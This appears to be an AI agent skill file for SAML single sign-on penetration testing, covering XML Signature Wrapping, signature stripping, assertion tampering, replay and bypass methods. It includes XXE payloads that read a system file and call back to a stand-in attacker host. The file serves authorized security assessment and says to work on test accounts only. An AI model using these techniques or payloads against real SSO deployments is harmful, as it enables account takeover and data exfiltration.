---
name: s-saml
description: Unified SAML Security skill linking hack-skills methodology with AboutSecurity execution resources. Covers SAML assertion manipulation, XML Signature Wrapping (XSW), signature stripping, SAML replay, and XXE-in-SAML attacks.
---

# Unified SAML Security

## When To Use

Use for SAML SSO security assessment, XML Signature Wrapping (XSW) attacks, SAML assertion manipulation (role/identity tampering), signature verification bypass, SAML replay attacks, and SAML Request forgery.

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | AboutSecurity |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

- Use hack-skills for methodology, scenario classification, domain coverage and deeper playbooks.
- Use AboutSecurity for execution constraints, mandatory rules, payload files, dictionaries, tool YAML configs, CTF and K8s fine-grained resources.
- Do not duplicate upstream content here. Load upstream files when needed.

## Recommended Loading Order

### High-Level Analysis

1. Read matched hack-skills files first unless Source Priority says otherwise.
2. Then read matched AboutSecurity files for constraints and execution details.

### Execution

1. Read matched AboutSecurity skill files first.
2. Check related Tools YAML.
3. Check related Payload/Dic/Doc files.
4. Fall back to hack-skills for scenario variants and methodology.

### CTF

1. Prefer AboutSecurity when this topic has matching AboutSecurity skills/resources.
2. Use hack-skills for broader theory or missing coverage.

### Bug Bounty / Authorized Assessment

1. Prefer hack-skills methodology and scenario files.
2. Use AboutSecurity tools/resources for execution support.

## Conflict Resolution

1. Safety and authorization rules always have highest priority.
2. AboutSecurity `NEVER`, `ALWAYS`, `禁止`, `必须`, `⛔` rules override general methodology during execution.
3. hack-skills is preferred for scenario classification, knowledge depth and real-world methodology.
4. AboutSecurity is preferred for tools, payloads, dictionaries, CTF and automated execution constraints.
5. For CTF tasks, prefer AboutSecurity unless this topic is mainly covered by hack-skills.
6. For bug bounty or authorized assessment, prefer hack-skills for strategy and AboutSecurity for resources.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/saml-sso-assertion-attacks/SKILL.md` — SKILL: SAML SSO Assertion Attacks — Expert Attack Playbook

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/auth/oauth-sso-attack/SKILL.md` — OAuth / SSO 攻击方法论（含 SAML）

## Related AboutSecurity Tools

- No match found.

## Related AboutSecurity Payloads

- No match found.

## Related AboutSecurity Dictionaries

- No match found.

## Related AboutSecurity Docs

- No match found.

## References

See `references/SOURCES.md`.

## Vulnerability Testing Output Template

When you discover a SAML SSO endpoint and begin active security testing, ⛔ **MUST** structure findings using this fixed 4-module output template.

### Module 1: 测试思路 (Testing Approach)
- Describe the SAML context: Identity Provider (IdP) URL, Service Provider (SP) ACS URL, binding type (HTTP-Redirect, HTTP-POST, Artifact), signature verification scheme (Response-level, Assertion-level, both)
- Classify the attack type: XML Signature Wrapping (XSW), signature stripping (remove Signature element), assertion tampering (modify NameID/attributes), SAML replay, XML External Entity (XXE) in SAML, SAML Request forgery (IdP-initiated vs SP-initiated)
- Fingerprint the SAML implementation: library (OpenSAML, Shibboleth, SimpleSAMLphp, OneLogin, AD FS, Okta, Auth0), canonicalization method, digest and signature algorithms
- Document the decision tree: SAML flow mapping (IdP→SP) → token capture → signature analysis → XSW transformation test → assertion tampering → XXE probe
- State expected success indicator: role escalation (user→admin), identity impersonation (login as another user), or information disclosure via XXE

### Module 0: 防护探测 filter_probe（⛔ 必须先于 payload）

对 SAML Response 进行签名验证探测：
- 移除整个 `ds:Signature` 元素 → 是否仍通过验证
- 修改 `Assertion` 中一个字符（不打乱 XML 结构）→ 是否检测到篡改
- 复制 `Assertion` 元素（XSW #1）→ 是否接受重复
- 在 `Response` 层级插入第二个 `Assertion` → 哪个被处理
- XXE 探测：在 SAML XML 中插入 `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` → 实体是否解析

每个单独测试，记入 `{操作: [防护情况, 说明]}`。
防护情况枚举：`放行` / `过滤` / `替换` / `拦截` / `转义`。

> 编号化测试要点见 `../pentest-windftsy/references/test-checkpoints.md` — **SAML001~003**。

### Module 2: 关键技巧 (Key Techniques)
- List 2-4 non-obvious technical details:
  - **XSW canonicalization mismatch**: SAML uses XML canonicalization before signature verification — if the SP and IdP use different canonicalization, XSW exploits the gap: insert a wrapped copy of the original Assertion with modified attributes, the signature verifier sees the unmodified copy while the application processes the modified one
  - **Comment-based XSW**: insert the original signed Assertion as an XML comment (`<!-- ... -->`) and add a new forged Assertion alongside — some parsers skip comments in canonicalization but the application reads the forged one
  - **SAML Response vs Assertion signature confusion**: `Response` is signed but `Assertion` within is not — modify the inner `Assertion` attributes (NameID, role, email) while keeping the outer `Response` signature intact; many SPs only validate the `Response` signature
  - **NameID format injection**: `NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"` → change to `Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent"` with attacker's ID to impersonate

### Module 3: Payload字典 (Payload Dictionary)
- ⛔ Provide minimum 3 payloads organized by scenario:
  1. **XSW #1 (copy Assertion after original)**: copy the signed `Assertion` element, modify the copy's `NameID` to target user, place after the original → SP processes the last Assertion
  2. **Signature stripping**: remove the `ds:Signature` element entirely — some SPs skip verification due to misconfiguration or accept unsigned Responses in certain flows
  3. **XXE via SAML**: inject `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/oob">]>` → blind XXE callback confirms SAML parser resolution
- Each entry format: `[XSW Type / Attack] <XML transformation description>` → expected behavior
- Use `saml-tool` / `saml-xsw` / `Burp SAML Raider` extension for automated XSW generation

### Module 4: 绕过方法 (Bypass Methods)
- Anticipate defensive measures and provide counter-strategies:
  1. **Schema validation bypass**: some SPs validate XML Schema before processing — XSW payloads must maintain schema validity while injecting modified Assertions; use namespaced wrappers
  2. **Signature algorithm downgrade**: if SP accepts multiple signature algorithms, downgrade from RSA-SHA256 to RSA-SHA1 (weaker), or to `http://www.w3.org/2000/09/xmldsig#rsa-sha1` which may have weaker validation logic
  3. **Response replay window**: SAML has a `NotOnOrAfter` window (usually 5 min) — capture a valid SAML Response, rapidly modify it, and replay within the validity window
  4. **IdP-initiated flow bypass**: when SP-initiated flow has strict validation, try IdP-initiated flow (POST directly to ACS) which may skip `InResponseTo` and relay state validation

## Important Agent Rules

- Do not treat this bridge file as the full knowledge source.
- Always load the matched upstream files needed for the task.
- Preserve and obey upstream mandatory execution rules.
- ⛔ SAML assertion tampering can lead to full account takeover — verify on test accounts only.
- Only operate in authorized environments.
